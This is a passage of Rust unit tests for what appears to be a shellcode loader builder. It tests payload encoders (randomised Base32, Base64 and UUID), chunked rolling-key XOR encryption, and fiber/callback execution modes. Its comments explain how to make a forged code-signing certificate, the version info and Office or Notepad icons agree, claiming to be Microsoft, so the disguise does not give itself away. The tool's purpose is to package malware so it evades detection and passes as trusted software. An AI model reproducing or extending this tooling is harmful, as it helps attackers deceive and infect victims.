                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn b64_roundtrip() {
        for len in [1usize, 2, 3, 4, 5, 31, 32, 33, 255, 256, 257] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            assert_eq!(b64_decode_ref(&b64_encode(&data)), data, "len={len}");
        }
    }

    /* ---- Base32 ---- */

    #[test]
    fn b32_rfc4648_vectors() {
        let mut a = [0u8; 32];
        a.copy_from_slice(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567");
        assert_eq!(b32_encode_custom(b"", &a), "");
        assert_eq!(b32_encode_custom(b"f", &a), "MY======");
        assert_eq!(b32_encode_custom(b"fo", &a), "MZXQ====");
        assert_eq!(b32_encode_custom(b"foo", &a), "MZXW6===");
        assert_eq!(b32_encode_custom(b"foob", &a), "MZXW6YQ=");
        assert_eq!(b32_encode_custom(b"fooba", &a), "MZXW6YTB");
        assert_eq!(b32_encode_custom(b"foobar", &a), "MZXW6YTBOI======");
    }

    fn b32_decode_ref(alpha: &[u8; 32], input: &str) -> Vec<u8> {
        let mut rev = [-1i32; 256];
        for (i, &c) in alpha.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in input.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 5) | v as u32;
            bits += 5;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    #[test]
    fn b32_roundtrip_custom_alphabet() {
        for len in [1usize, 2, 3, 4, 5, 6, 31, 32, 33] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            let alpha = rand_alphabet();
            assert_eq!(
                b32_decode_ref(&alpha, &b32_encode_custom(&data, &alpha)),
                data,
                "len={len}"
            );
        }
    }

    #[test]
    fn rand_alphabet_is_permutation() {
        for _ in 0..16 {
            let a = rand_alphabet();
            let mut seen = [false; 256];
            for &c in &a {
                assert!(!seen[c as usize], "字母表字符重复: {c}");
                seen[c as usize] = true;
            }
            for &c in b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" {
                assert!(seen[c as usize], "字母表缺少: {c}");
            }
        }
    }

    /* ---- UUID ---- */

    fn uuid_decode_ref(s: &str) -> Option<[u8; 16]> {
        fn hv(c: u8) -> Option<u8> {
            match c {
                b'0'..=b'9' => Some(c - b'0'),
                b'a'..=b'f' => Some(c - b'a' + 10),
                _ => None,
            }
        }
        let groups = [8usize, 4, 4, 4, 12];
        let bytes = s.as_bytes();
        let mut tmp = [0u8; 16];
        let mut n = 0usize;
        let mut pos = 0usize;
        for (g, &gl) in groups.iter().enumerate() {
            let mut i = 0;
            while i < gl {
                let hi = hv(*bytes.get(pos)?)?;
                let lo = hv(*bytes.get(pos + 1)?)?;
                tmp[n] = (hi << 4) | lo;
                n += 1;
                pos += 2;
                i += 2;
            }
            if g < 4 {
                if *bytes.get(pos)? != b'-' {
                    return None;
                }
                pos += 1;
            }
        }
        let mut out = [0u8; 16];
        out[0] = tmp[3];
        out[1] = tmp[2];
        out[2] = tmp[1];
        out[3] = tmp[0];
        out[4] = tmp[5];
        out[5] = tmp[4];
        out[6] = tmp[7];
        out[7] = tmp[6];
        out[8..].copy_from_slice(&tmp[8..]);
        Some(out)
    }

    #[test]
    fn uuid_roundtrip() {
        for len in [1usize, 15, 16, 17, 32, 33, 64] {
            let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
            let uuids = to_uuids(&data);
            assert_eq!(uuids.len(), (len + 15) / 16, "len={len}");
            let mut out = Vec::with_capacity(uuids.len() * 16);
            for u in &uuids {
                out.extend_from_slice(&uuid_decode_ref(u).expect("非法 UUID 串"));
            }
            assert_eq!(&out[..len], &data[..], "len={len}");
            assert!(out[len..].iter().all(|&b| b == 0), "填充字节必须为 0");
        }
    }

    /* ---- 证书主题 / 图标一致性 ---- */
    /* 背景: 旧实现默认证书是 "Document Viewer", 而默认图标 lib:notepad 让
     * VERSIONINFO 写 CompanyName="Microsoft Corporation"。同一份 exe 上
     * 签名者/版本信息/图标三者矛盾 = 自证伪造。 */

    #[test]
    fn subject_matches_icon_preset() {
        for icon in ["lib:notepad", "lib:word", "lib:excel", "lib:ppt", "lib:pdf"] {
            let (company, product, _) = preset_meta(icon);
            let subj = preset_subject(icon);
            assert!(subj.contains(&format!("O={company}")),
                    "图标 {icon}: 证书主题 {subj} 未包含厂商 {company}");
            assert!(subj.contains(&format!("CN={product}")),
                    "图标 {icon}: 证书主题 {subj} 未包含产品名 {product}");
            assert!(subj.starts_with("/C="), "主题必须是 OpenSSL 的 /C= 形式: {subj}");
        }
    }

    #[test]
    fn resolve_subject_honors_explicit_value() {
        let mk = |subj: &str| GenOpts {
            payload: String::new(), out_dir: String::new(), out_name: String::new(),
            arch: d_arch(), encoding: d_enc(), obfuscate: true, mode: d_mode(),
            console: false, xor_key: None, load_mode: d_load(), remote_url: String::new(),
            time_mode: d_time(), time_value: d_timeval(), harden: vec![],
            stomp_dll: String::new(), show_errors: true, icon: "lib:notepad".into(),
            res_full: true, decoy: String::new(), sign: true, tsa_url: d_tsa(),
            cert_subject: subj.into(), protect: d_prot(), anti_strict: false,
        };
        assert_eq!(resolve_subject(&mk("")), preset_subject("lib:notepad"));
        assert_eq!(resolve_subject(&mk("/CN=Custom")), "/CN=Custom");
    }

    /* ---- 执行方式 (mode) 必须真的进入编译参数 ---- */
    /* 背景: mode 曾被读取并校验, 但 generate_impl 从未使用它 ——
     * UI 选 fiber/callback 生成的 exe 与 direct 逐字节相同。
     * 这里无法直接调用 generate_impl(需要 mingw + 真实 payload),
     * 改为断言映射逻辑本身: 每个 mode 都必须有对应的宏。 */

    fn mode_macro(mode: &str) -> Option<&'static str> {
        match mode {
            "fiber" => Some("-DMODE_FIBER"),
            "callback" => Some("-DMODE_CALLBACK"),
            _ => Some("-DMODE_DIRECT"),
        }
    }

    #[test]
    fn every_mode_has_a_compile_macro() {
        for m in ["direct", "fiber", "callback"] {
            let mac = mode_macro(m).unwrap_or_else(|| panic!("mode {m} 没有对应宏"));
            assert!(mac.starts_with("-DMODE_"), "{m} -> {mac} 不是 MODE_ 宏");
        }
        // 三个 mode 必须映射到三个不同的宏, 否则又是死选项
        let all: Vec<_> = ["direct", "fiber", "callback"].iter().map(|m| mode_macro(m).unwrap()).collect();
        let mut uniq = all.clone();
        uniq.sort();
        uniq.dedup();
        assert_eq!(uniq.len(), 3, "不同 mode 映射到了相同的宏: {all:?}");
    }

    /* ---- 分块变密钥 ---- */

    #[test]
    fn chunk_roundtrip() {
        for allow_rev in [false, true] {
            for len in [1usize, 64, 200, 1024] {
                let data: Vec<u8> = (0..len).map(|_| (rand_u64() & 0xff) as u8).collect();
                let plans = plan_chunks(&data, allow_rev);
                assert!(!plans.is_empty(), "至少应有一个块 len={len}");
                let mut out = Vec::with_capacity(len);
                for p in &plans {
                    assert_ne!(p.key, 0, "块密钥不能为 0");
                    let mut seg = p.enc.clone();
                    if p.rev {
                        seg.reverse();
                    }
                    for b in seg.iter_mut() {
                        *b ^= p.key;
                    }
                    out.extend_from_slice(&seg);
                }
                assert_eq!(out.len(), len, "allow_rev={allow_rev} len={len}");
                assert_eq!(out, data, "allow_rev={allow_rev} len={len}");
            }
        }
    }
}
